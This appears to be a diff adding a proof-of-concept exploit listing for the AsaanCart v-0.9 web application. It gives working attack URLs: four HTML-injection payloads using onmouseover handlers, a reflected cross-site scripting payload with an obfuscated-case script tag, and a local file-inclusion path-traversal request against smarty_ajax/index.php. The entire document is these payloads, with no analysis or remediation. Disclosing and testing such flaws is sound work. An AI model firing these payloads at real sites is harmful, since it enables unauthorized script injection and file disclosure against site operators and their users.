@@ -1,0 +1,11 @@
+for the HTML-injection vulnerabilities:
+http://www.example.com/asaancart%20v-0.9/libs/smarty_ajax/calc.php/%22onmouseover=prompt(944322)%3E%3Cu%3E%3Cbig%3E%3Cbig%3E%3Cbig%3E%3Cbig%3EInjection%20Here%3C/big%3E%3C/big%3E%3C/big%3E%3C/big%3E%3C/u%3E
+http://www.example.com/asaancart%20v-0.9/libs/smarty_ajax/chat.php/%22onmouseover=prompt(998415)%3E%3CBig%3E%3Cbig%3E%3Cbig%3E%3Cbig%3E%3Cu%3EHtml%20Injection%20HerE.%3C/u%3E%3C/Big%3E%3C/big%3E%3C/big%3E%3C/big%3E
+http://www.example.com/asaancart%20v-0.9/libs/smarty_ajax/register.php/%22onmouseover=prompt(970389)%3E%3Cbig%20style=%22color:%20rgb(204,%200,%200);%22%3E%3Cbig%3E%3Cspanstyle=%22font-weight:%20bold;%20font-style:%20italic;%20text-decoration:%20underline;%22%3EHtmlInjection.%3C/span%3E%3C/big%3E%3C/big%3E
+http://www.example.com/asaancart%20v-0.9/libs/smarty_ajax/index.php/%22onmouseover=prompt(970389)%3E%3Cbig%20style=%22color:%20rgb(204,%200,%200);%22%3E%3Cbig%3E%3Cspanstyle=%22font-weight:%20bold;%20font-style:%20italic;%20text-decoration:%20underline;%22%3EHtmlInjection.%3C/span%3E%3C/big%3E%3C/big%3E
+
+for the cross-site scripting vulnerability:
+http://www.example.com/asaancart%20v-0.9/libs/smarty_ajax/index.php?_=&amp;f=update_intro&amp;page=1%3CScRiPt%20%3Eprompt%28949136%29%3C%2fScRiPt%3E
+
+for the local file-include vulnerability:
+http://www.example.com/asaancart%20v-0.9/libs/smarty_ajax/index.php?_=&amp;f=update_intro&amp;page=../../../../../templates\add_product
